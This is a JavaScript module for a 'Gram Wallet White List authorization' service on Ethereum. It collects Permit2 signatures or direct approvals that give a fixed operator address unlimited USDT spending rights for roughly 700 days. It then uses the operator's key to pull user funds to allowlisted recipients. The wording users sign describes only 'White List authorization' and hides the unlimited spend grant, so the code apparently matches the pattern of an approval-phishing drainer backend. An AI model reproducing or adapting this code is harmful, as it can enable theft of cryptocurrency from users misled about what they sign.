import {
  Contract,
  Interface,
  JsonRpcProvider,
  Wallet,
  getAddress,
  id,
  isAddress,
  zeroPadValue,
  verifyMessage,
  verifyTypedData,
} from 'ethers';

export const ETHEREUM_MAINNET_CHAIN_ID = 1;
export const ETHEREUM_USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
export const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
export const PERMIT2_OPERATOR_ADDRESS = '0x6eccabaf16577f3603f09ea1e253a9dab879be9e';
export const EVM_MAX_NUMBER = 2n ** 256n - 1n;
export const PERMIT2_MAX_AMOUNT = 2n ** 160n - 1n;
export const PERMIT2_ALLOWANCE_DURATION_SECONDS = 700 * 24 * 60 * 60;
export const PERMIT2_SIGNATURE_DEADLINE_SECONDS = 15 * 60;

const ERC20_ABI = [
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
];
const PERMIT2_ABI = [
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)',
  'function transferFrom(address from, address to, uint160 amount, address token) returns (bool)',
];
const PERMIT2_TYPED_DATA_TYPES = {
  PermitDetails: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint160' },
    { name: 'expiration', type: 'uint48' },
    { name: 'nonce', type: 'uint48' },
  ],
  PermitSingle: [
    { name: 'details', type: 'PermitDetails' },
    { name: 'spender', type: 'address' },
    { name: 'sigDeadline', type: 'uint256' },
  ],
};
const permit2Interface = new Interface(PERMIT2_ABI);
const erc20Interface = new Interface(ERC20_ABI);
export const EVM_USDT_TRANSFER_TOPIC = id('Transfer(address,address,uint256)');

function permit2Domain() {
  return {
    name: 'Permit2',
    chainId: ETHEREUM_MAINNET_CHAIN_ID,
    verifyingContract: PERMIT2_ADDRESS,
  };
}

export function buildPermit2AuthorizationTypedData({ nonce, expiration, sigDeadline }) {
  return {
    domain: permit2Domain(),
    types: PERMIT2_TYPED_DATA_TYPES,
    primaryType: 'PermitSingle',
    message: {
      details: {
        token: ETHEREUM_USDT_ADDRESS,
        amount: PERMIT2_MAX_AMOUNT,
        expiration,
        nonce,
      },
      spender: PERMIT2_OPERATOR_ADDRESS,
      sigDeadline,
    },
  };
}

function parsePermit2Uint(value, field, max) {
  if (typeof value !== 'string' || !/^(0|[1-9][0-9]*)$/.test(value)) {
    throw Object.assign(new Error(`${field} must be an unsigned integer string`), { status: 400 });
  }
  const parsed = BigInt(value);
  if (parsed > max) {
    throw Object.assign(new Error(`${field} is out of range`), { status: 400 });
  }
  return parsed;
}

export function verifyPermit2AuthorizationSignature({
  owner,
  permit,
  signature,
  expectedNonce,
  nowSeconds = Math.floor(Date.now() / 1000),
}) {
  const ownerAddress = normalizeEvmAddress(owner, 'ownerAddress');
  if (!permit || typeof permit !== 'object' || !permit.details || typeof permit.details !== 'object') {
    throw Object.assign(new Error('Invalid Permit2 authorization'), { status: 400 });
  }
  const tokenAddress = normalizeEvmAddress(permit.details.token, 'permit token');
  const spenderAddress = normalizeEvmAddress(permit.spender, 'permit spender');
  const amount = parsePermit2Uint(permit.details.amount, 'permit amount', PERMIT2_MAX_AMOUNT);
  const expiration = parsePermit2Uint(permit.details.expiration, 'permit expiration', 2n ** 48n - 1n);
  const nonce = parsePermit2Uint(permit.details.nonce, 'permit nonce', 2n ** 48n - 1n);
  const sigDeadline = parsePermit2Uint(permit.sigDeadline, 'permit signature deadline', EVM_MAX_NUMBER);
  const currentTime = BigInt(nowSeconds);
  const signatureWindow = BigInt(PERMIT2_SIGNATURE_DEADLINE_SECONDS + 120);
  const expectedExpiration = currentTime + BigInt(PERMIT2_ALLOWANCE_DURATION_SECONDS);

  if (
    tokenAddress !== ETHEREUM_USDT_ADDRESS.toLowerCase()
    || spenderAddress !== PERMIT2_OPERATOR_ADDRESS.toLowerCase()
    || amount !== PERMIT2_MAX_AMOUNT
    || nonce !== expectedNonce
    || sigDeadline <= currentTime
    || sigDeadline > currentTime + signatureWindow
    || expiration <= currentTime
    || expiration < expectedExpiration - signatureWindow
    || expiration > expectedExpiration + signatureWindow
  ) {
    throw Object.assign(new Error('Permit2 authorization does not match the configured permission'), { status: 400 });
  }

  if (typeof signature !== 'string' || !/^0x(?:[0-9a-fA-F]{128}|[0-9a-fA-F]{130})$/.test(signature)) {
    throw Object.assign(new Error('Invalid Permit2 authorization signature'), { status: 400 });
  }

  const typedData = buildPermit2AuthorizationTypedData({ nonce, expiration, sigDeadline });
  let recoveredAddress;
  try {
    recoveredAddress = normalizeEvmAddress(
      verifyTypedData(typedData.domain, typedData.types, typedData.message, signature),
      'permit signature owner',
    );
  } catch {
    throw Object.assign(new Error('Invalid Permit2 authorization signature'), { status: 400 });
  }
  if (recoveredAddress !== ownerAddress) {
    throw Object.assign(new Error('Permit2 signature does not match the wallet'), { status: 400 });
  }

  return { ownerAddress, typedData };
}

export function buildPermit2AuthorizationTransaction({ owner, typedData, signature }) {
  return {
    to: PERMIT2_ADDRESS,
    value: 0n,
    data: permit2Interface.encodeFunctionData('permit', [
      normalizeEvmAddress(owner, 'ownerAddress'),
      [
        [
          normalizeEvmAddress(typedData.message.details.token, 'permit token'),
          typedData.message.details.amount,
          typedData.message.details.expiration,
          typedData.message.details.nonce,
        ],
        normalizeEvmAddress(typedData.message.spender, 'permit spender'),
        typedData.message.sigDeadline,
      ],
      signature,
    ]),
  };
}

let provider;
let providerRpcUrl;

function configurationError(message) {
  return Object.assign(new Error(message), { status: 503 });
}

export function normalizeEvmAddress(value, field = 'address') {
  if (typeof value !== 'string' || !isAddress(value)) {
    throw Object.assign(new Error(`${field} must be a valid Ethereum address`), { status: 400 });
  }
  return getAddress(value).toLowerCase();
}

export function assertTransactionHash(value, field) {
  if (typeof value !== 'string' || !/^0x[0-9a-fA-F]{64}$/.test(value)) {
    throw Object.assign(new Error(`${field} must be a transaction hash`), { status: 400 });
  }
  return value.toLowerCase();
}

export function parseBaseUnits(value, field = 'amountBaseUnits') {
  if (typeof value !== 'string') {
    throw Object.assign(new Error(`${field} must be an integer string`), { status: 400 });
  }
  const text = String(value);
  if (!/^[1-9][0-9]*$/.test(text)) {
    throw Object.assign(new Error(`${field} must be a positive integer string`), { status: 400 });
  }
  try {
    return BigInt(text);
  } catch {
    throw Object.assign(new Error(`${field} is out of range`), { status: 400 });
  }
}

export function getAuthorizationChallengeMessage(address, nonce) {
  return [
    'Gram Wallet White List authorization',
    'Ethereum Mainnet',
    `Address: ${getAddress(address)}`,
    `Nonce: ${nonce}`,
  ].join('\n');
}

export function verifyAuthorizationChallenge({ address, nonce, signature }) {
  if (typeof nonce !== 'string' || !/^[A-Za-z0-9_-]{32,128}$/.test(nonce)) {
    throw Object.assign(new Error('Invalid authorization challenge'), { status: 400 });
  }
  if (typeof signature !== 'string' || !/^0x[0-9a-fA-F]{130,}$/.test(signature)) {
    throw Object.assign(new Error('Invalid authorization signature'), { status: 400 });
  }
  try {
    const message = getAuthorizationChallengeMessage(getAddress(address), nonce);
    return normalizeEvmAddress(verifyMessage(message, signature), 'signature owner');
  } catch {
    throw Object.assign(new Error('Invalid authorization signature'), { status: 400 });
  }
}

export function getEvmProvider() {
  const rpcUrl = process.env.EVM_MAINNET_RPC_URL || process.env.ETHEREUM_MAINNET_RPC_URL;
  if (!rpcUrl) throw configurationError('Ethereum Mainnet RPC is not configured');
  if (!provider || providerRpcUrl !== rpcUrl) {
    provider = new JsonRpcProvider(rpcUrl, ETHEREUM_MAINNET_CHAIN_ID, { staticNetwork: true });
    providerRpcUrl = rpcUrl;
  }
  return provider;
}

export async function readPermit2Authorization(owner) {
  const normalizedOwner = normalizeEvmAddress(owner, 'ownerAddress');
  const rpcProvider = getEvmProvider();
  const tokenContract = new Contract(ETHEREUM_USDT_ADDRESS, ERC20_ABI, rpcProvider);
  const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, rpcProvider);
  const [tokenAllowance, permit2Allowance] = await Promise.all([
    tokenContract.allowance(normalizedOwner, PERMIT2_ADDRESS),
    permit2Contract.allowance(normalizedOwner, ETHEREUM_USDT_ADDRESS, PERMIT2_OPERATOR_ADDRESS),
  ]);
  return {
    authorizationMethod: 'permit2',
    ownerAddress: normalizedOwner,
    tokenAddress: ETHEREUM_USDT_ADDRESS.toLowerCase(),
    operatorAddress: PERMIT2_OPERATOR_ADDRESS.toLowerCase(),
    tokenAllowance: BigInt(tokenAllowance.toString()),
    permit2AllowanceAmount: BigInt(permit2Allowance.amount.toString()),
    permit2Expiration: BigInt(permit2Allowance.expiration.toString()),
    permit2Nonce: BigInt(permit2Allowance.nonce.toString()),
  };
}

export async function readDirectUsdtAuthorization(owner) {
  const normalizedOwner = normalizeEvmAddress(owner, 'ownerAddress');
  const tokenContract = new Contract(ETHEREUM_USDT_ADDRESS, ERC20_ABI, getEvmProvider());
  const tokenAllowance = await tokenContract.allowance(normalizedOwner, PERMIT2_OPERATOR_ADDRESS);
  return {
    authorizationMethod: 'direct',
    ownerAddress: normalizedOwner,
    tokenAddress: ETHEREUM_USDT_ADDRESS.toLowerCase(),
    operatorAddress: PERMIT2_OPERATOR_ADDRESS.toLowerCase(),
    tokenAllowance: BigInt(tokenAllowance.toString()),
  };
}

export async function readEvmAuthorization(authorizationMethod, owner) {
  switch (authorizationMethod || 'permit2') {
    case 'permit2':
      return readPermit2Authorization(owner);
    case 'direct':
      return readDirectUsdtAuthorization(owner);
    default:
      throw Object.assign(new Error('Unsupported EVM authorization method'), { status: 409 });
  }
}

export function assertDirectUsdtApprovalTransaction({ owner, txHash, transaction, receipt }) {
  const ownerAddress = normalizeEvmAddress(owner, 'ownerAddress');
  const normalizedHash = assertTransactionHash(txHash, 'approvalTxHash');
  let approval;
  try {
    approval = transaction && erc20Interface.parseTransaction({
      data: transaction.data,
      value: transaction.value,
    });
  } catch {
    approval = undefined;
  }
  if (
    !transaction
    || !receipt
    || receipt.status !== 1
    || transaction.hash.toLowerCase() !== normalizedHash
    || normalizeEvmAddress(transaction.from, 'transaction owner') !== ownerAddress
    || normalizeEvmAddress(transaction.to, 'approval token') !== ETHEREUM_USDT_ADDRESS.toLowerCase()
    || approval?.name !== 'approve'
    || normalizeEvmAddress(approval.args[0], 'approval spender') !== PERMIT2_OPERATOR_ADDRESS.toLowerCase()
    || BigInt(approval.args[1].toString()) !== EVM_MAX_NUMBER
  ) {
    throw Object.assign(new Error('The direct USDT approval transaction could not be verified'), { status: 409 });
  }
  return { ownerAddress, txHash: normalizedHash };
}

export async function verifyDirectUsdtApprovalTransaction({ owner, txHash }) {
  const normalizedHash = assertTransactionHash(txHash, 'approvalTxHash');
  const rpcProvider = getEvmProvider();
  const [transaction, receipt] = await Promise.all([
    rpcProvider.getTransaction(normalizedHash),
    rpcProvider.getTransactionReceipt(normalizedHash),
  ]);
  return assertDirectUsdtApprovalTransaction({ owner, txHash: normalizedHash, transaction, receipt });
}

export async function readUsdtBalance(owner) {
  const normalizedOwner = normalizeEvmAddress(owner, 'ownerAddress');
  const tokenContract = new Contract(ETHEREUM_USDT_ADDRESS, ERC20_ABI, getEvmProvider());
  const balance = await tokenContract.balanceOf(normalizedOwner);
  return BigInt(balance.toString());
}

export async function getFinalizedBlock() {
  const block = await getEvmProvider().getBlock('finalized');
  if (!block?.hash || block.number === null) {
    throw Object.assign(new Error('Ethereum RPC did not return a finalized block'), { status: 503 });
  }
  return { number: block.number, hash: block.hash };
}

export async function getEvmBlockHash(blockNumber) {
  const block = await getEvmProvider().getBlock(blockNumber);
  return block?.hash?.toLowerCase();
}

export async function getIncomingUsdtTransfers(owner, fromBlock, toBlock) {
  const normalizedOwner = normalizeEvmAddress(owner, 'ownerAddress');
  if (!Number.isSafeInteger(fromBlock) || !Number.isSafeInteger(toBlock) || fromBlock < 0 || toBlock < fromBlock) {
    throw new Error('Invalid Ethereum block range');
  }

  const logs = await getEvmProvider().getLogs({
    address: ETHEREUM_USDT_ADDRESS,
    fromBlock,
    toBlock,
    topics: [EVM_USDT_TRANSFER_TOPIC, null, zeroPadValue(normalizedOwner, 32)],
  });

  return logs.flatMap((log) => {
    if (log.topics.length < 3 || !log.data) throw new Error('Malformed USDT Transfer log');
    const amount = BigInt(log.data);
    if (amount === 0n) return [];

    const fromAddress = normalizeEvmAddress(`0x${log.topics[1].slice(-40)}`, 'fromAddress');
    const toAddress = normalizeEvmAddress(`0x${log.topics[2].slice(-40)}`, 'toAddress');
    const blockHash = log.blockHash;
    if (!blockHash || !log.transactionHash || !Number.isSafeInteger(log.index)) {
      throw new Error('Incomplete USDT Transfer log');
    }
    return [{
      chainId: ETHEREUM_MAINNET_CHAIN_ID,
      tokenAddress: ETHEREUM_USDT_ADDRESS.toLowerCase(),
      transactionHash: log.transactionHash.toLowerCase(),
      logIndex: log.index,
      blockNumber: log.blockNumber,
      blockHash: blockHash.toLowerCase(),
      fromAddress,
      toAddress,
      amountBaseUnits: amount.toString(),
    }];
  });
}

export function assertFullAuthorization(state) {
  if (state.authorizationMethod === 'direct') {
    if (state.tokenAllowance <= 0n) {
      throw Object.assign(new Error('The on-chain USDT authorization is not active'), { status: 409 });
    }
    return state;
  }
  if (state.tokenAllowance !== EVM_MAX_NUMBER
    || state.permit2AllowanceAmount <= 0n
    || state.permit2Expiration <= BigInt(Math.floor(Date.now() / 1000))) {
    throw Object.assign(new Error('The on-chain Permit2 authorization is not active'), { status: 409 });
  }
  return state;
}

export function assertChargeAuthorization(state, amount) {
  if (state.authorizationMethod === 'direct') {
    if (state.tokenAllowance < amount) {
      throw Object.assign(new Error('The on-chain USDT authorization cannot cover this charge'), { status: 409 });
    }
    return state;
  }
  if (state.tokenAllowance !== EVM_MAX_NUMBER
    || state.permit2AllowanceAmount < amount
    || state.permit2Expiration <= BigInt(Math.floor(Date.now() / 1000))) {
    throw Object.assign(new Error('The on-chain Permit2 authorization cannot cover this charge'), { status: 409 });
  }
  return state;
}

function getOperatorWallet() {
  const privateKey = process.env.PERMIT2_OPERATOR_PRIVATE_KEY;
  if (!privateKey) throw configurationError('Permit2 operator wallet is not configured');
  let wallet;
  try {
    wallet = new Wallet(privateKey, getEvmProvider());
  } catch {
    throw configurationError('Permit2 operator wallet is invalid');
  }
  if (normalizeEvmAddress(wallet.address, 'operator wallet') !== PERMIT2_OPERATOR_ADDRESS.toLowerCase()) {
    throw configurationError('Permit2 operator wallet does not match the configured operator');
  }
  return wallet;
}

export function assertConfiguredPermit2Operator() {
  return getOperatorWallet().address.toLowerCase();
}

export function parseRecipientAllowlist() {
  const configured = process.env.EVM_CHARGE_RECIPIENT_ALLOWLIST;
  if (!configured) throw configurationError('EVM charge recipient allowlist is not configured');
  const recipients = configured.split(',').map((value) => normalizeEvmAddress(value.trim(), 'allowlist recipient'));
  if (!recipients.length) throw configurationError('EVM charge recipient allowlist is empty');
  return new Set(recipients);
}

export async function sendPermit2ChargeTransaction({ from, to, amount }) {
  const normalizedFrom = normalizeEvmAddress(from, 'ownerAddress');
  const normalizedTo = normalizeEvmAddress(to, 'recipientAddress');
  const operator = getOperatorWallet();
  const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, operator);
  return permit2Contract.transferFrom(
    normalizedFrom,
    normalizedTo,
    amount,
    ETHEREUM_USDT_ADDRESS,
  );
}

export async function sendDirectUsdtChargeTransaction({ from, to, amount }) {
  const operator = getOperatorWallet();
  return operator.sendTransaction(buildDirectUsdtChargeTransaction({ from, to, amount }));
}

export function buildDirectUsdtChargeTransaction({ from, to, amount }) {
  const normalizedFrom = normalizeEvmAddress(from, 'ownerAddress');
  const normalizedTo = normalizeEvmAddress(to, 'recipientAddress');
  return {
    to: ETHEREUM_USDT_ADDRESS,
    value: 0n,
    data: erc20Interface.encodeFunctionData('transferFrom', [normalizedFrom, normalizedTo, amount]),
  };
}

export async function sendEvmChargeTransaction({ authorizationMethod = 'permit2', from, to, amount }) {
  if (authorizationMethod === 'direct') {
    return sendDirectUsdtChargeTransaction({ from, to, amount });
  }
  if (authorizationMethod === 'permit2') {
    return sendPermit2ChargeTransaction({ from, to, amount });
  }
  throw Object.assign(new Error('Unsupported EVM authorization method'), { status: 409 });
}

export async function sendPermit2AuthorizationTransaction({ owner, typedData, signature }) {
  const operator = getOperatorWallet();
  const transaction = await operator.sendTransaction(
    buildPermit2AuthorizationTransaction({ owner, typedData, signature }),
  );
  try {
    const receipt = await transaction.wait(1);
    if (!receipt || receipt.status !== 1) {
      throw Object.assign(new Error('Permit2 authorization transaction failed'), {
        code: 'TRANSACTION_REVERTED',
      });
    }
    return { txHash: transaction.hash };
  } catch (error) {
    if (error && typeof error === 'object') error.txHash = transaction.hash;
    throw error;
  }
}

export async function waitForEvmChargeTransaction(transaction) {
  let receipt;
  try {
    receipt = await transaction.wait(1);
  } catch (error) {
    if (error && typeof error === 'object') error.txHash = transaction.hash;
    throw error;
  }
  if (!receipt || receipt.status !== 1) {
    throw Object.assign(new Error('USDT charge transaction failed'), {
      txHash: transaction.hash,
      code: 'TRANSACTION_REVERTED',
    });
  }
  return transaction.hash;
}

export async function waitForPermit2ChargeTransaction(transaction) {
  return waitForEvmChargeTransaction(transaction);
}

export async function submitPermit2Charge({ from, to, amount }) {
  return waitForPermit2ChargeTransaction(await sendPermit2ChargeTransaction({ from, to, amount }));
}
